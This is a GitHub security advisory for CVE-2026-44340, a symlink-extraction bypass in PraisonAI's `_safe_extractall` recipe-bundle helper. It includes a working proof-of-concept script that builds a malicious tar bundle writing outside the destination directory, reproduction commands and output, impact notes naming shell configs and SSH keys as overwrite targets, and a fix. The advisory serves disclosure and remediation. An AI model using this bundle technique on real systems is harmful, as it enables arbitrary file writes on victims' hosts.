# [H] PraisonAI's symlink-extraction bypass of `_safe_extractall` writes outside `dest_dir`

## Summary
Severity: High
Advisory: GHSA-9q28-ghcr-c4x3
CVE: CVE-2026-44340
CWE: CWE-22, CWE-59
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-05-11
Source: https://github.com/advisories/GHSA-9q28-ghcr-c4x3
Type: github-advisory

## Affected
- PyPI: `PraisonAI` — affected >=0 <4.6.37

## Details
### Summary
The `_safe_extractall` helper that all `recipe pull`, `recipe publish`, and `recipe unpack` flows route through validates each archive member's `name` for absolute paths, `..` segments, and resolved-path escape — but does **not** validate `member.linkname`, does not reject symlink/hardlink members, and calls `tar.extractall(dest_dir)` without `filter="data"`. A bundle that contains a symlink with a name
inside `dest_dir` but a `linkname` pointing outside it, followed by a regular file whose path traverses *through* the just-created symlink, escapes `dest_dir` and lets the attacker write arbitrary content to an attacker-chosen location on the victim's filesystem.

## Affected paths

Every code path that calls `_safe_extractall` is exposed:

| Caller | File:line |
|---|---|
| `praisonai recipe unpack` | `src/praisonai/praisonai/cli/features/recipe.py:1175` (introduced as the fix for GHSA-99g3-w8gr-x37c) |
| `LocalRegistry.unpack` (recipe pull) | `src/praisonai/praisonai/recipe/registry.py:413` |
| Registry archive validation (publish) | `src/praisonai/praisonai/recipe/registry.py:808` |

## Root cause

`recipe/registry.py:131-178`:

```python
def _safe_extractall(tar: tarfile.TarFile, dest_dir: Path) -> None:
    ...
    for member in tar.getmembers():
        ...
        member_path = Path(member.name)
        if member_path.is_absolute(): raise RegistryError(...)
        if '..' in member_path.parts: raise RegistryError(...)
        resolved = (dest_resolved / member_path).resolve()
        if not str(resolved).startswith(str(dest_resolved) + os.sep) and resolved != dest_resolved:
            raise RegistryError(...)
    # All members validated — safe to extract
    tar.extractall(dest_dir)
```

Three gaps:

1. The loop checks only `member.name`. `member.linkname` (the symlink / hardlink target) is not inspected.
2. `member.issym()` and `member.islnk()` are not used to refuse link members at all.
3. `tar.extractall(dest_dir)` runs without `filter="data"`. On Python ≤ 3.13 the default is `fully_trusted` (with a DeprecationWarning on 3.12+), which permits symlinks pointing outside `dest_dir`.

When the archive is extracted in member order, the symlink lands first, and any subsequent member whose path traverses through that symlink follows it to the attacker's chosen location.

## Reproduction

Tested in a disposable container against `praisonai==4.6.35` (`pip install praisonai`, no other modifications).

`make_bundle.py`:

```python
import io, json, tarfile
manifest = json.dumps({"name": "legit", "version": "1.0.0"}).encode()
with tarfile.open("malicious.praison", "w:gz") as tar:
    info = tarfile.TarInfo("manifest.json"); info.size = len(manifest)
    tar.addfile(info, io.BytesIO(manifest))

    sym = tarfile.TarInfo("legit/escape")
    sym.type = tarfile.SYMTYPE
    sym.linkname = "/tmp/PWNED"
    tar.addfile(sym)

    payload = b"PWNED via symlink-extraction bypass of _safe_extractall\n"
    pf = tarfile.TarInfo("legit/escape/owned.txt"); pf.size = len(payload)
    tar.addfile(pf, io.BytesIO(payload))
```

`direct_test.py`:

```python
import shutil, tarfile
from pathlib import Path
from praisonai.recipe.registry import _safe_extractall

DEST = Path("/work/recipes_direct")
shutil.rmtree(DEST, ignore_errors=True); DEST.mkdir(parents=True)
Path("/tmp/PWNED").mkdir(parents=True, exist_ok=True)

with tarfile.open("malicious.praison", "r:gz") as tar:
    _safe_extractall(tar, DEST)

assert Path("/tmp/PWNED/owned.txt").exists(), "did not escape"
print("PWNED:", Path("/tmp/PWNED/owned.txt").read_text())
```

Run:

```bash
docker run --rm -v "$PWD:/work" -w /work python:3.11-slim sh -c '
  pip install -q praisonai &&
  python make_bundle.py &&
  python direct_test.py
'
```

Observed output:

```
_safe_extractall returned cleanly
PWNED: PWNED via symlink-extraction bypass of _safe_extractall
```

`/tmp/PWNED/owned.txt` exists after the call returns, written outside the destination directory the helper was asked to extract into.

## Impact

Arbitrary file write with attacker-controlled content to an attacker-chosen path, on every host that processes a malicious `.praison` bundle through any of the three callers above.

Realistic exploitation paths:

- A user runs `praisonai recipe unpack ./<malicious>.praison` after obtaining the bundle from a shared registry, a tutorial link, or
  direct messaging.
- A user runs `praisonai recipe pull <name>` against a malicious or compromised registry.
- A registry server processes an uploaded `.praison` bundle (the publish path is reachable over the network if the server is exposed. per GHSA-r9x3-wx45-2v7f and GHSA-2xgv-5cv2-47vv).

Where the agent process runs as a regular user, the attacker can overwrite shell config (`.bashrc`, `.zshrc`, `.profile`), SSH `authorized_keys`, cron entries, or project files in adjacent directories. Where the process runs as root (registry-server deployments and some `sudo`-launched workflows), the attacker controls arbitrary system files.

This re-opens the `recipe pull`, `recipe publish`, and `recipe unpack` paths that GHSA-99g3-w8gr-x37c, GHSA-4rx4-4r3x-6534, GHSA-r9x3-wx45-2v7f, and GHSA-4ph2-f6pf-79wv were each intended to close.

## Suggested remediation

Single-line fix at `recipe/registry.py:178`:

```python
tar.extractall(dest_dir, filter="data")
```

`filter="data"` (introduced in Python 3.12; available as a backport on 3.8+ via the official PEP 706 reference implementation) refuses
symlinks, hardlinks, device nodes, and absolute or escaping link targets, it is the canonical Python defense against this class.
If you also support older Python, add an explicit guard inside the existing per-member loop before `tar.extractall`:

```python
if member.issym() or member.islnk():
    link_target = (dest_resolved / member_path.parent / member.linkname).resolve()
    if member.linkname.startswith("/") or not str(link_target).startswith(str(dest_resolved) + os.sep):
        raise RegistryError(
            f"Refusing to extract link with target outside dest dir: "
            f"{member.name} -> {member.linkname}"
        )
```

## Affected versions

`praisonai >= 2.7.2` through current `4.6.35` (the helper exists at least back to the earliest path-traversal patch chain referenced in
GHSA-99g3-w8gr-x37c). All releases that route extraction through `_safe_extractall` are exposed.

## Disclosure

Reported privately via the project's GHSA workflow at
https://github.com/MervinPraison/PraisonAI/security/advisories/new

-- Dhiral Vyas

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-9q28-ghcr-c4x3
- https://nvd.nist.gov/vuln/detail/CVE-2026-44340
- https://github.com/MervinPraison/PraisonAI
